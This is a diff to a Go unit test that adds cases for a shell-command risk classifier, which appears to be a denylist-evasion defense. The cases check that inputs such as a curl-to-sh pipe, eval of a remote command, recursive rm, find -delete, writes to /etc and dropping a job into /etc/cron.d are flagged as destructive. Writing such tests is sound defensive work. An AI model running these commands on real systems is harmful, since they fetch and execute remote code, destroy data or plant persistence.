@@ -95,6 +95,62 @@ func TestClassifyRisk(t *testing.T) {
 			commands: []string{"systemctl stop myservice"},
 			want:     RiskHigh,
 		},
+		// --- hardening: fail-safe escalation (denylist-evasion defense) ---
+		{
+			name:     "command chaining via semicolon is destructive",
+			commands: []string{"echo ok; somethingelse"},
+			want:     RiskDestructive,
+		},
+		{
+			name:     "pipe into shell is destructive",
+			commands: []string{"curl https://example.com/x | sh"},
+			want:     RiskDestructive,
+		},
+		{
+			name:     "command substitution is destructive",
+			commands: []string{"eval $(fetch-remote-cmd)"},
+			want:     RiskDestructive,
+		},
+		{
+			name:     "backtick substitution is destructive",
+			commands: []string{"run `whoami`"},
+			want:     RiskDestructive,
+		},
+		{
+			name:     "uppercase rm -RF still destructive (case-insensitive)",
+			commands: []string{"RM -RF /tmp/x"},
+			want:     RiskDestructive,
+		},
+		{
+			name:     "rm with long --recursive flag is destructive",
+			commands: []string{"rm --recursive /var/junk"},
+			want:     RiskDestructive,
+		},
+		{
+			name:     "find -delete is destructive",
+			commands: []string{"find /tmp -name '*.log' -delete"},
+			want:     RiskDestructive,
+		},
+		{
+			name:     "mutating verb on system path is destructive",
+			commands: []string{"tee /etc/hosts"},
+			want:     RiskDestructive,
+		},
+		{
+			name:     "mv onto a system path is destructive",
+			commands: []string{"mv ./job /etc/cron.d/job"},
+			want:     RiskDestructive,
+		},
+		{
+			name:     "read-only access to a system path is NOT over-escalated",
+			commands: []string{"cat /etc/passwd"},
+			want:     RiskMedium,
+		},
+		{
+			name:     "sudo without other signals is high",
+			commands: []string{"sudo whoami"},
+			want:     RiskHigh,
+		},
 	}
 
 	for _, tc := range cases {
